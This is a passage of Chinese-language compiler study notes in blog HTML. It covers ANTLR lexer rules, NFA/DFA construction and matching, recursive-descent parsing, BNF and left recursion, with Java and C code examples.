class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">lexer grammar Hello;  <span class="comment">//lexer 关键字意味着这是一个词法规则文件，名称是 Hello，要与文件名相同</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// 关键字</span></span><br><span class="line">If :               <span class="string">&#x27;if&#x27;</span>;</span><br><span class="line">Int :              <span class="string">&#x27;int&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 字面量</span></span><br><span class="line">IntLiteral:        [<span class="number">0</span><span class="number">-9</span>]+;</span><br><span class="line">StringLiteral:      <span class="string">&#x27;&quot;&#x27;</span> .*? <span class="string">&#x27;&quot;&#x27;</span> ;  <span class="comment">// 字符串字面量</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// 操作符</span></span><br><span class="line">AssignmentOP:       <span class="string">&#x27;=&#x27;</span> ;    <span class="comment">//赋值</span></span><br><span class="line">RelationalOP:       <span class="string">&#x27;&gt;&#x27;</span>|<span class="string">&#x27;&gt;=&#x27;</span>|<span class="string">&#x27;&lt;&#x27;</span> |<span class="string">&#x27;&lt;=&#x27;</span> ;    <span class="comment">//关系式</span></span><br><span class="line">Star:               <span class="string">&#x27;*&#x27;</span>;</span><br><span class="line">Plus:               <span class="string">&#x27;+&#x27;</span>;</span><br><span class="line">Sharp:              <span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">SemiColon:          <span class="string">&#x27;;&#x27;</span>;</span><br><span class="line">Dot:                <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">Comm:               <span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">LeftBracket :       <span class="string">&#x27;[&#x27;</span>;</span><br><span class="line">RightBracket:       <span class="string">&#x27;]&#x27;</span>;</span><br><span class="line">LeftBrace:          <span class="string">&#x27;&#123;&#x27;</span>;</span><br><span class="line">RightBrace:         <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">LeftParen:          <span class="string">&#x27;(&#x27;</span>;</span><br><span class="line">RightParen:         <span class="string">&#x27;)&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 标识符</span></span><br><span class="line">Id :                [a-zA-Z_] ([a-zA-Z_] | [<span class="number">0</span><span class="number">-9</span>])*;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 空白字符，抛弃</span></span><br><span class="line">Whitespace:         [ \t]+ -&gt; skip;</span><br><span class="line">Newline:            ( <span class="string">&#x27;\r&#x27;</span> <span class="string">&#x27;\n&#x27;</span>?|<span class="string">&#x27;\n&#x27;</span>)-&gt; skip;</span><br></pre></td></tr></table></figure><p>  EscapeSequence 转义序列</p><p>  fragment : 指的是一个语法片段</p></li><li><p>正则文法生成词法分析器</p><p>  我提到有限自动机（FSA）有有限个状态。识别 Token 的过程，就是 FSA 状态迁移的过程。其中，FSA 分为<strong>确定的有限自动机（DFA）和非确定的有限自动机（NFA）。所有的正则表达式都能转换成 NFA 或 DFA，所有的 NFA 或 DFA，也都能转换成正则表达式。</strong></p><ul><li><p>DFA（Deterministic Finite Automaton）</p>  <img src="/2022/07/08/CompilerNote/Untitled4.png" class title="Untitled"><p>  <strong>DFA</strong> 的特点是<strong>，</strong>在任何一个状态，我们基于输入的字符串，都能做一个确定的转换。</p></li><li><p>NFA（Nondeterministic Finite Automaton）</p><p>  <strong>NFA</strong> 的特点是<strong>，</strong>它存在某些状态，针对某些输入，不能做一个确定的转换，这又细分成两种情况：</p><ul><li>对于一个输入，它有两个状态可以转换。</li><li>存在ε转换。也就是没有任何输入的情况下，也可以从一个状态迁移到另一个状态。</li></ul><p>  比如，“a[a-zA-Z0-9]*bc”这个正则表达式对字符串的要求是以 a 开头，以 bc 结尾，a 和 bc 之间可以有任意多个字母或数字。在图中状态 1 的节点输入 b 时，这个状态是有两条路径可以选择的，所以这个有限自动机是一个 NFA。</p>  <img src="/2022/07/08/CompilerNote/Untitled5.png" class title="Untitled"></li><li><p>正则表达式生成 NFA转换到DFA</p><p>  把正则表达式解析成一个内部的数据结构</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//用来测试的正则表达式可以是 int 关键字、标识符，或者数字字面量</span></span><br><span class="line"><span class="type">int</span> | [a-zA-Z][a-zA-Z0-<span class="number">9</span>]* | [<span class="number">0</span>-<span class="number">9</span>]*</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> GrammerNode <span class="title function_">sampleGrammer1</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">GrammarNode</span> <span class="variable">node</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GrammerNode</span>(<span class="string">&#x27;regex1&#x27;</span> , GrammarNodeType.Or);</span><br><span class="line"><span class="comment">//int 关键字</span></span><br><span class="line"><span class="type">GrammarNode</span> <span class="variable">intNode</span> <span class="operator">=</span> node.createChild(GrammarNodeType.And);</span><br><span class="line">intNode.createChild(<span class="keyword">new</span> <span class="title class_">CharSet</span>(<span class="string">&#x27;i&#x27;</span>));</span><br><span class="line">intNode.createChild(<span class="keyword">new</span> <span class="title class_">CharSet</span>(<span class="string">&#x27;n&#x27;</span>));</span><br><span class="line">intNode.createChild(<span class="keyword">new</span> <span class="title class_">CharSet</span>(<span class="string">&#x27;t&#x27;</span>));</span><br><span class="line"><span class="comment">//标识符</span></span><br><span class="line"><span class="type">GrammarNode</span> <span class="variable">idNode</span> <span class="operator">=</span> node.createChild(GrammarNodeType.And);</span><br><span class="line">    <span class="type">GrammarNode</span> <span class="variable">firstLetter</span> <span class="operator">=</span> idNode.createChild(CharSet.letter);</span><br><span class="line">    <span class="type">GrammarNode</span> <span class="variable">letterOrDigit</span> <span class="operator">=</span> idNode.createChild(CharSet.letterOrDigit);</span><br><span class="line">    letterOrDigit.setRepeatTimes(<span class="number">0</span>, -<span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 数字字面量</span></span><br><span class="line">    <span class="type">GrammarNode</span> <span class="variable">literalNode</span> <span class="operator">=</span> node.createChild(CharSet.digit);</span><br><span class="line">    literalNode.setRepeatTimes(<span class="number">1</span>, -<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>  <img src="/2022/07/08/CompilerNote/Untitled6.png" class title="Untitled">  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//“0 ε -&gt; 2”的意思是从状态 0 通过ε转换，到达状态 2 </span></span><br><span class="line">NFA states:</span><br><span class="line"><span class="number">0</span>ε -&gt; <span class="number">2</span>         <span class="comment">//三个子表达式，三者选一</span></span><br><span class="line">ε -&gt; <span class="number">8</span></span><br><span class="line">ε -&gt; <span class="number">14</span></span><br><span class="line"><span class="number">2</span>i -&gt; <span class="number">3</span></span><br><span class="line"><span class="number">3</span>n -&gt; <span class="number">5</span></span><br><span class="line"><span class="number">5</span>t -&gt; <span class="number">7</span></span><br><span class="line"><span class="number">7</span>ε -&gt; <span class="number">1</span></span><br><span class="line"><span class="number">1</span>(end)</span><br><span class="line">acceptable</span><br><span class="line"><span class="number">8</span>[a-z]|[A-Z] -&gt; <span class="number">9</span></span><br><span class="line"><span class="number">9</span>ε -&gt; <span class="number">10</span>                       <span class="comment">//9到13这块是s*，0 到多次,对s匹配零次,也可以在s的起止节点上循环多次</span></span><br><span class="line">ε -&gt; <span class="number">13</span></span><br><span class="line"><span class="number">10</span>[<span class="number">0</span>-<span class="number">9</span>]|[a-z]|[A-Z] -&gt; <span class="number">11</span></span><br><span class="line"><span class="number">11</span>ε -&gt; <span class="number">10</span></span><br><span class="line">ε -&gt; <span class="number">13</span></span><br><span class="line"><span class="number">13</span>ε -&gt; <span class="number">1</span></span><br><span class="line"><span class="number">14</span>[<span class="number">0</span>-<span class="number">9</span>] -&gt; <span class="number">15</span>                  <span class="comment">//14到15是s+,1到多次,没有办法跳过s,s至少经过一次。</span></span><br><span class="line"><span class="number">15</span>ε -&gt; <span class="number">14</span></span><br><span class="line">ε -&gt; <span class="number">1</span></span><br></pre></td></tr></table></figure><p>  图中分为上中下三条路径分别是解析 int 关键字、标识符和数字字面量的过程：</p>  <img src="/2022/07/08/CompilerNote/Untitled7.png" class title="Untitled"><p>  以上图为例，当我们解析 intA 这个字符串时，首先选择最上面的路径去匹配，匹配完 int 这三个字符以后，来到状态 7，若后面没有其他字符，就可以到达接受状态 1，返回匹配成功的信息。可实际上，int 后面是有 A 的，所以第一条路径匹配失败。</p><p>  失败之后不能直接返回“匹配失败”的结果，因为还有其他路径，所以我们要回溯到状态 0，去尝试第二条路径，在第二条路径中，尝试成功了。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//基于 NFA 处理字符串</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 用 NFA 来匹配字符串</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> state 当前所在的状态</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> chars 要匹配的字符串，用数组表示</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> index1 当前匹配字符开始的位置。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 匹配后，新 index 的位置。指向匹配成功的字符的下一个字符。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">matchWithNFA</span><span class="params">(State state,<span class="type">char</span>[] chars,<span class="type">int</span> index1)</span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;trying state :&quot;</span> +state.name + <span class="string">&quot;,index = &quot;</span> + index1);</span><br><span class="line"><span class="type">int</span> <span class="variable">index2</span> <span class="operator">=</span> index1;</span><br><span class="line"><span class="keyword">for</span>(Transition transition : state.transitions())&#123;</span><br><span class="line"><span class="type">State</span> <span class="variable">nextState</span> <span class="operator">=</span> state.getState(transition);</span><br><span class="line"><span class="comment">//epsilon转换 ε</span></span><br><span class="line"><span class="keyword">if</span>(transition.isEpsilon())&#123;</span><br><span class="line">index2 = matchWithNFA(nextState , chars , index1);</span><br><span class="line"><span class="keyword">if</span>(index2 == chars.length)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//消耗掉一个字符指针前移</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(transition.match(chars[index1]))&#123;</span><br><span class="line">index2 ++; <span class="comment">// 消耗掉一个字符</span></span><br><span class="line"><span class="keyword">if</span>(index2 &lt; chars.length)&#123;</span><br><span class="line">index2 = matchWithNFA(nextState , chars ,index1 + <span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 如果已经扫描完所有字符</span></span><br><span class="line">            <span class="comment">// 检查当前状态是否是接受状态，或者可以通过 epsilon 到达接受状态</span></span><br><span class="line">            <span class="comment">// 如果状态机还没有到达接受状态，本次匹配失败</span></span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (acceptable(nextState)) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    index2 = -<span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> index2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//output 回溯过程</span></span><br><span class="line">NFA matching: <span class="string">&#x27;intA&#x27;</span></span><br><span class="line">trying state : <span class="number">0</span>, index =<span class="number">0</span></span><br><span class="line">trying state : <span class="number">2</span>, index =<span class="number">0</span>    <span class="comment">// 先走第一条路径，即 int 关键字这个路径</span></span><br><span class="line">trying state : <span class="number">3</span>, index =<span class="number">1</span></span><br><span class="line">trying state : <span class="number">5</span>, index =<span class="number">2</span></span><br><span class="line">trying state : <span class="number">7</span>, index =<span class="number">3</span></span><br><span class="line">trying state : <span class="number">1</span>, index =<span class="number">3</span>    <span class="comment">// 到了末尾了，发现还有字符&#x27;A&#x27;没有匹配上</span></span><br><span class="line">trying state : <span class="number">8</span>, index =<span class="number">0</span>    <span class="comment">// 回溯，尝试第二条路径，即标识符</span></span><br><span class="line">trying state : <span class="number">9</span>, index =<span class="number">1</span></span><br><span class="line">trying state : <span class="number">10</span>, index =<span class="number">1</span>   <span class="comment">// 在 10 和 11 这里循环多次</span></span><br><span class="line">trying state : <span class="number">11</span>, index =<span class="number">2</span></span><br><span class="line">trying state : <span class="number">10</span>, index =<span class="number">2</span></span><br><span class="line">trying state : <span class="number">11</span>, index =<span class="number">3</span></span><br><span class="line">trying state : <span class="number">10</span>, index =<span class="number">3</span></span><br><span class="line"><span class="literal">true</span></span><br></pre></td></tr></table></figure><p>  NFA的特点是非常多试探回溯，把NFA转换成DFA叫<strong>子集构造法</strong></p><p>  1.ε-closure(s)，即集合 s 的ε闭包。也就是从集合 s 中的每个节点，加上从这个节点出发通过ε转换所能到达的所有状态。</p><p>  2.move(s, ‘i’)，即从集合 s 接收一个字符 i，所能到达的新状态的集合。</p><p>  所以，s1 &#x3D; ε-closure(move(s0,‘i’))</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//子集构造法</span></span><br><span class="line">计算 s0，即状态 <span class="number">0</span> 的ε闭包</span><br><span class="line">把 s0 压入待处理栈</span><br><span class="line">把 s0 加入所有状态集的集合 S</span><br><span class="line">循环：待处理栈内还有未处理的状态集</span><br><span class="line">   循环：针对字母表中的每个字符 c</span><br><span class="line">      循环：针对栈里的每个状态集合 s(i)（未处理的状态集）</span><br><span class="line">          计算 s(m) = move(s(i), c)（就是从 s(i) 出发，接收字符 c 能够</span><br><span class="line">                                   迁移到的新状态的集合）</span><br><span class="line">          计算 s(m) 的ε闭包，叫做 s(j)</span><br><span class="line">          看看 s(j) 是不是个新的状态集，如果已经有这个状态集了，把它找出来</span><br><span class="line">                  否则，把 s(j) 加入全集 S 和待处理栈</span><br><span class="line">          建立 s(i) 到 s(j) 的连线，转换条件是 c</span><br></pre></td></tr></table></figure>  <img src="/2022/07/08/CompilerNote/Untitled8.png" class title="Untitled"><p>  从初始状态开始，如果输入是 i，那就走 int 识别这条线，也就是按照 19、21、22 这条线依次迁移，如果中间发现不符合 int 模式，就跳转到 20，也就是标识符状态。</p><p>  注意，在上面的 DFA 中，只要包含接受状态 1 的，都是 DFA 的接受状态。进一步区分的话，22 是 int 关键字的接受状态，因为它包含了 int 关键字原来的接受状态 7。同理，17 是数字字面量的接受状态，18、19、20、21 都是标识符的接受状态。</p><p>  NFA 和 DFA 有各自的优缺点：NFA 通常状态数量比较少，可以直接用来进行计算，但可能会涉及回溯，从而性能低下；DFA 的状态数量可能很大，占用更多的空间，并且生成 DFA 本身也需要消耗计算资源。所以，我们根据实际需求选择采用 NFA 还是 DFA 就可以了。</p></li></ul></li></ul></li><li><p>编写语法分析器</p><p>   <a href="https://resources.jointjs.com/demos/javascript-ast">语法树自动在线生成</a></p><p>  Yacc词法分析是识别一个个的单词，而语法分析就是在词法分析的基础上识别出程序的树状结构语法结构。一个程序就是一棵树，这棵树叫做<strong>抽象语法树</strong><br>  （Abstract Syntax Tree，AST）。树的每个节点（子树）是一个语法单元，这个单元的构成规则就叫“语法”。每个节点还可以有下级节点。可以用递归下降的算法来实现。</p>  <img src="/2022/07/08/CompilerNote/Untitled9.png" class title="Untitled">  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//使用clang查看具体AST clang -cc1 -ast-dump hello.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line">    <span class="type">int</span> age = <span class="number">45</span>;</span><br><span class="line">    <span class="keyword">if</span> (age &gt;= <span class="number">17</span>+<span class="number">8</span>+<span class="number">20</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Hello old man!\\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Hello young man!\\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>  <img src="/2022/07/08/CompilerNote/Untitled10.png" class title="Untitled"><p>  变量声明语句 int age &#x3D; 45 ; 它的左边是一个<code>非终结符（Non-terminal）</code>。右边是它的<code>产生式（Production Rule）</code>。在语法解析的过程中，左边会被右边替代。如果替代之后还有<code>非终结符</code>，那么继续这个替代过程，直到最后全部都是<code>终结符（Terminal）</code>，也就是 Token。只有终结符才可以成为 AST 的<code>叶子节点</code>。这个过程，也叫做推导（Derivation）过程：</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">intDeclaration : Int <span class="title function_">Identifier</span> <span class="params">(<span class="string">&#x27;=&#x27;</span> additiveExpression)</span>?;</span><br><span class="line"><span class="comment">//int 类型变量的声明，</span></span><br><span class="line"><span class="comment">//需要有一个 Int 型的 Token，加一个变量标识符，后面跟一个可选的赋值表达式</span></span><br></pre></td></tr></table></figure><p>  我们把上面的文法翻译成程序语句，伪代码如下：</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MatchIntClare()&#123;</span><br><span class="line">MatchToken(Int)；        <span class="comment">// 匹配 Int 关键字</span></span><br><span class="line">  MatchIdentifier();       <span class="comment">// 匹配标识符</span></span><br><span class="line">  MatchToken(equal);       <span class="comment">// 匹配等号</span></span><br><span class="line">  MatchExpression();       <span class="comment">// 匹配表达式</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  具体实现：</p><blockquote><p>解析变量声明语句时，我先看第一个 Token 是不是 int。如果是，就创建一个 AST 节点，记下 int 后面的变量名称，然后再看后面是不是跟了初始化部分，也就是等号加一个表达式。我们检查一下有没有等号，有的话，接着再匹配一个表达式。</p></blockquote>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">SimpleASTNode node = null;</span><br><span class="line">Token token = tokens.peek(); <span class="comment">//预读(读取下一个token,预先看一下下一个 Token 是否是等号</span></span><br><span class="line"><span class="keyword">if</span>(token !=null &amp;&amp; token.getType() == TokenType.Int)&#123; <span class="comment">//匹配 Int 关键字</span></span><br><span class="line">token = tokens.read();    <span class="comment">//消耗掉Int,会从 Token 流中移除，下一个 Token 变成了当前的 Token</span></span><br><span class="line"><span class="keyword">if</span>(tokens.peek().getType() == TokenType.Identifier)&#123;  <span class="comment">// 匹配标识符</span></span><br><span class="line">token = tokens.read();   <span class="comment">// 消耗掉标识符</span></span><br><span class="line"><span class="comment">// 创建当前节点，并把变量名记到 AST 节点的文本值中，</span></span><br><span class="line"><span class="comment">// 这里新建一个变量子节点也是可以的</span></span><br><span class="line">node = new SimpleASTNode(ASTNodeType.IntDeclaration , token.getText());</span><br><span class="line">token = tokens.peek(); <span class="comment">//预读</span></span><br><span class="line"><span class="keyword">if</span> (token != null &amp;&amp; token.getType() == TokenType.Assignment) &#123;</span><br><span class="line">            tokens.read();      <span class="comment">// 消耗掉等号</span></span><br><span class="line">            SimpleASTNode child = additive(tokens);  <span class="comment">// 匹配一个表达式</span></span><br><span class="line">            <span class="keyword">if</span> (child == null) &#123;</span><br><span class="line">                throw new Exception(<span class="string">&quot;invalide variable initialization, expecting an expression&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                node.addChild(child);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        throw new Exception(<span class="string">&quot;variable name expected&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  我们把解析变量声明语句和表达式的算法分别写成函数。在语法分析的时候，调用这些函数跟后面的 Token 串做模式匹配。匹配上了，就返回一个 AST 节点，否则就返回 null。如果中间发现跟语法规则不符，就报编译错误。</p><p>  在这个过程中，上级文法嵌套下级文法，上级的算法调用下级的算法。表现在生成 AST 中，上级算法生成上级节点，下级算法生成下级节点。<strong>这就是“下降”的含义。程序结构基本上是跟文法规则同构的。这就是递归下降算法的优点，非常直观。</strong>自顶向下算法能减少回溯的次数</p><p>  正则文法是上下文无关文法的一个子集,上下文无关文法允许递归调用，而正则文法不允许。上下文无关的意思是，无论在任何情况下，文法的推导规则都是一样的。比如，在变量声明语句中可能要用到一个算术表达式来做变量初始化，而在其他地方可能也会用到算术表达式。不管在什么地方，算术表达式的语法都一样，都允许用加法和乘法，计算优先级也不变。</p><p>  例如 ： 2 + 3 * 5”的 AST</p>  <img src="/2022/07/08/CompilerNote/Untitled11.png" class title="Untitled"><ul><li><p>关于BNF</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//BNF</span></span><br><span class="line">additiveExpression</span><br><span class="line">    :   multiplicativeExpression</span><br><span class="line">    |   multiplicativeExpression Plus additiveExpression</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">这个实际上就是语法规则，是用BNF表达的。以addtive为例，它有两个产生式。</span><br><span class="line">产生式<span class="number">1</span>：一个乘法表达式</span><br><span class="line">产生式<span class="number">2</span>：一个加法表达式 + 乘法表达式。</span><br><span class="line">通过上面两个产生式的组合，特别是产生式<span class="number">2</span>的递归调用，就能推导出所有的加减乘数算术表达式。</span><br><span class="line">比如，对于<span class="number">2</span>*<span class="number">3</span>这个表达式，运用的是产生式<span class="number">1</span>。</span><br><span class="line">对于<span class="number">2</span>+<span class="number">3</span>*<span class="number">5</span>，运用的是产生式<span class="number">2</span>。</span><br></pre></td></tr></table></figure><p>  算法可以首先尝试产生式1。推导顺序是这样的：</p><p>  additive -&gt; multiplicative(加法的产生式1)</p><p>  -&gt; Intliteral（2）（乘法的产生式1）</p><p>  这时候只消化了一个Token。我们是要用一个表达式把这5个Token都消化掉才行。所以会继续尝试乘法的产生式2。</p><p>  additive -&gt; multiplicative(加法的产生式1)</p><p>  -&gt; Intliteral * multiplicative （乘法的产生式2）</p><p>  这次尝试不成功，因为我们下一个Token是加号，不是乘号。</p><p>  现在，退回来尝试加法的产生式2。</p><p>  additive -&gt; multiplicative + additive(加法的产生式2)</p><p>  -&gt; Intliteral(2) + additive</p><p>  -&gt;Intliteral(2) + multiplicative</p><p>  -&gt; Intliteral(2) + Intliteral(3) 不行，因为还有Token</p><p>  -&gt; Intliteral(2) + Intliteral(3) * multiplicative 又用上乘法的产生式2了</p><p>  -&gt;Intliteral(2) + Intliteral(3) * Intliteral(5)</p><p>  这是严格的推导过程。我在示例代码的实现中，因为提取了左公因子，所以没用多次回溯。</p></li><li><p>为什么出现左递归Left Recursive(左推导LeftMost)无限调用</p><p>  为了方便讨论，我们把规则简化一下，去掉乘法那一层。否则在乘法那就已经无限递归下去了。例如2+3，修改后为：</p><p>  additive -&gt; IntLiteral | additive Intliteral ;</p><p>  我们假设是最左推导，也就是总是先展开左边的非中介符。</p><p>  第一遍：additive-&gt;IntLiteral，但因为后面还有Token没处理完，所以这个推导过程会失败，要退回来。这可能是你没理解的地方。我们是要用additive匹配整个Token串，而不仅仅是第一个Token。</p><p>  第二遍：用第二个产生式，additive-&gt;additive-&gt;IntLiteral，还是一样失败。</p><p>  第三遍：additive-&gt;additive-&gt;additive-&gt;IntLiteral。</p><p>  第四遍：….</p><p>  结论：</p><p>  在二元表达式的语法规则中，如果产生式的第一个元素是它自身，那么程序就会无限地递归下去，这种情况就叫做<strong>左递归。</strong>比如加法表达式的产生式“加法表达式 + 乘法表达式”，就是左递归的。</p></li><li><p>文法和语法的区别</p><p>  文法，英文叫做Grammar，是形式语言（Formal Language）的一个术语。所以也有Formal Grammar这样的说法。这里的文法有定义清晰的规则。比如，我们的词法规则、语法规则和属性规则，使用形式文法来定义的。我们的课程里讲解了<strong>正则文法</strong>(Regular Grammar)、<strong>上下文无关文法</strong>(Context-free Grammar)等不同的文法规则，<strong>用来描述词法和语法</strong>。</p><p>  语法分析中的这个语法，英文是Syntax，主要是<strong>描述词是怎么组成句子的</strong>。一个语言的语法规则，通常指的是这个Syntax。</p><p>  问题是，Grammar这个词，在中文很多应用场景中也叫做语法。这是会引起混淆的地方。我们在使用的时候要小心一点就行了。比如，我做了一个规则文件，里面都是一些<strong>词法规则</strong>（Lexer Grammar），我会说，这是一个词法规则文件，或者词法文法文件。这个时候，把它说成是一个语法规则文件，就有点含义模糊。因为这里面并没有语法规则（Syntax Grammar）。</p></li><li><p>书写语法规则并推导</p><p>  如果某个句子，能用某个文法推导出来，那就说这个句子符合某个文法。替换过程，就是推导过程。这样不断替换，就是不断推导。我们说语法解析，实际上是语法推导的反过程，是把它怎么推导的过程给逆向出来。</p><p>  语法规则是由上下文无关文法表示的，而上下文无关文法是由一组替换规则（又叫产生式）组成的，比如算术表达式的文法规则可以表达成下面这种形式：</p>  <figure class="highlight 